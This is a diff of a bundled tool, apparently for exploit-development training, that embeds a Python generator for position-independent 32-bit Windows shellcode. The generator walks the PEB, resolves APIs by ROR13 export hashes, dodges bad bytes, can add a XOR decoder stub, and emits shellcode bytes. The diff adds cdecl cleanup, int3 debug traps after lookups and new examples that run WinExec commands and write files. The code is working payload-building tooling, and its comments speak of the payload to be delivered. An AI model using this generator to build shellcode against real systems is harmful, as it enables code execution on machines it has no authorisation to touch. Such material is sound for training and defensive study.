@@ -11446,10 +11446,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-20T14:22:28.708Z" : globalThis[key2];
+        value = true ? "2026-11-20T14:25:08.256Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "5a18cf8f5ae5" : globalThis[key2];
+        value = true ? "7353c05d3485" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -14758,6 +14758,10 @@ an export resolver, LoadLibraryA for other DLLs, one cached address per API, the
 calls, the exit), assembles it line by line, reports every bad byte with its offset
 and line, writes shellcode.bin and prints the bytes as a Python literal.
 Exit code 1 means a check failed.
+
+Nothing is chosen without being checked against BADCHARS: the registers the PEB walk
+and the resolver run on, the form of every constant and string push, and the stack
+cleanup after a cdecl call.
 """
 import collections
 import itertools
@@ -14884,6 +14888,14 @@ PAGE_EXECUTE_READWRITE = 0x40
 #              "ret" = restore the registers and return to the caller.
 # XOR_ENCODER  True prepends a XOR decoder stub, as plan B when a bad byte remains.
 #              The stub decodes in place, so the shellcode page must be writable.
+#              With it on, bad bytes in the body are reported but do not fail the
+#              build, because the stub decodes them before they run.
+# CDECL        Export names the caller must clean up after, beyond the ones the
+#              builder already knows. See the second example below.
+# DEBUG        True puts an int3 after every name lookup, taken only when the
+#              lookup came back 0. Under a debugger you land on the int3 for the
+#              name that failed instead of calling address 0 later. Five bytes
+#              per lookup, so leave it False for the payload you deliver.
 #
 # Write one call per line, in execution order. k32 is kernel32.dll:
 #
@@ -14906,6 +14918,24 @@ PAGE_EXECUTE_READWRITE = 0x40
 # The name holds the call's position, captured when the call ran. Inserting
 # another call above it cannot move it.
 #
+# buf(size) works the same way. Give it a name and every call that takes the name
+# gets one address, so one API can fill a buffer and the next can read it:
+#
+#   path = buf(260)
+#   k32.GetTempPathA(260, path)
+#   k32.lstrcatA(path, s("out.txt"))
+#
+# A buf(size) written inline is its own space, for an out-parameter nothing else
+# reads, as the buf(4) of WriteFile in example 3.
+#
+# Win32 is stdcall, where the API drops its own arguments. The builder knows the
+# varargs formatters and the C runtime are cdecl and cleans up after them itself.
+# For any other cdecl export, name it in CDECL or call it through .cdecl:
+#
+#   CDECL = ("MyPrintf",)
+#   dll("mine.dll").MyPrintf(buf(64), s("%u"), 1)
+#   dll("mine.dll").OtherPrintf.cdecl(buf(64), s("%u"), 1)
+#
 # Example 1: run a command, then end the process.
 #   k32.WinExec(s("cmd.exe /c whoami > C:\\\\Users\\\\Public\\\\w.txt"), SW_HIDE)
 #   EXIT = "terminate"
@@ -14921,6 +14951,17 @@ PAGE_EXECUTE_READWRITE = 0x40
 #   k32.CloseHandle(handle)
 #   EXIT = "ret"
 #
+# Example 4: format text into a buffer, then write that buffer. wsprintfA is cdecl
+# and returns the length, which WriteFile takes as the count.
+#   text = buf(64)
+#   pid = k32.GetCurrentProcessId()
+#   written = dll("user32.dll").wsprintfA(text, s("pid=%u"), pid)
+#   handle = k32.CreateFileA(s("C:\\\\Users\\\\Public\\\\pid.txt"), GENERIC_WRITE, 0, NULL,
+#                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
+#   k32.WriteFile(handle, text, written, buf(4), NULL)
+#   k32.CloseHandle(handle)
+#   EXIT = "exit"
+#
 # The older form still works: a literal CALLS = [(dll, api, [args])] list, with
 # ref(n) for the result of call n, counted from 1. Use one form or the other. A
 # CONFIG block that holds both fails to build.
@@ -14930,6 +14971,8 @@ BADCHARS = b"\\x00"
 MAX_SIZE = None
 EXIT = "terminate"
 XOR_ENCODER = False
+CDECL = ()
+DEBUG = False
 
 k32.WinExec(s("calc.exe"), SW_SHOWNORMAL)
 # <<< CONFIG
@@ -14937,6 +14980,7 @@ k32.WinExec(s("calc.exe"), SW_SHOWNORMAL)
 
 # A CONFIG block written before these knobs existed still builds.
 CDECL = globals().get("CDECL", ())
+DEBUG = globals().get("DEBUG", False)
 
 try:
     from keystone import Ks, KS_ARCH_X86, KS_MODE_32
@@ -15091,6 +15135,24 @@ def push_const(value, note, reg="eax"):
     if form is None:
         raise BuildError(f"no clean way to push {hex(v)} ({note})")
     return noted(form, note)
+
+
+def trap_if_zero(tag, what):
+    """DEBUG: int3 the moment a lookup leaves EAX at 0, instead of calling address 0 later.
+
+    The jump clears its own int3, so it is two bytes however far apart the lookups sit and
+    cannot plant a bad byte of its own. Landing EIP names the lookup that failed, which the
+    listing below maps back to its line. Five bytes per lookup.
+    """
+    if not DEBUG:
+        return []
+    if 0xcc in BAD:
+        raise BuildError("DEBUG needs the int3 byte 0xcc, which BADCHARS forbids")
+    label = "dbg_" + re.sub(r"\\W", "_", tag)
+    return [Op("test eax, eax"),
+            Op(f"jnz {label}", f"DEBUG: on past the trap, {what} is there"),
+            Op("int3", f"DEBUG: {what} came back 0"),
+            Op(f"{label}:")]
 
 
 def drop_args(count, note):
@@ -15405,6 +15467,7 @@ def build_body(calls):
         return push_const(ror13(api), f'ROR13("{api}") = 0x{ror13(api):08x}') + [
             Op(f"push {frame.slot(dll)}", f"{dll} base"),
             Op(f"call {frame.slot('resolver')}", f"eax = {api}"),
+        ] + trap_if_zero(f"{dll}_{api}", f"{dll}!{api}") + [
             Op(f"mov {frame.slot(dll + '!' + api)}, eax", f"{api} cached"),
         ]
 
@@ -15414,8 +15477,9 @@ def build_body(calls):
         body.append(comment(f"LoadLibraryA(\\"{dll}\\"), base cached."))
         body += push_text(dll.encode("latin-1") + b"\\x00")
         body += [Op("push esp", f'lpLibFileName -> "{dll}"'),
-                 Op(f"call {frame.slot(KERNEL32 + '!LoadLibraryA')}", f"eax = {dll} base"),
-                 Op(f"mov {frame.slot(dll)}, eax", f"{dll} base")]
+                 Op(f"call {frame.slot(KERNEL32 + '!LoadLibraryA')}", f"eax = {dll} base")]
+        body += trap_if_zero(f"{dll}_base", f'LoadLibraryA("{dll}")')
+        body.append(Op(f"mov {frame.slot(dll)}, eax", f"{dll} base"))
     for dll, api in apis:
         if (dll, api) != (KERNEL32, "LoadLibraryA") or not loaded:
             body += resolve(dll, api)
@@ -16185,6 +16249,8 @@ if __name__ == "__main__":
       `MAX_SIZE = ${(_a2 = plan.maxSize) != null ? _a2 : "None"}`,
       `EXIT = "${exit}"`,
       `XOR_ENCODER = ${plan.xor ? "True" : "False"}`,
+      "CDECL = ()",
+      "DEBUG = False",
       "",
       ...direct,
       ...calls
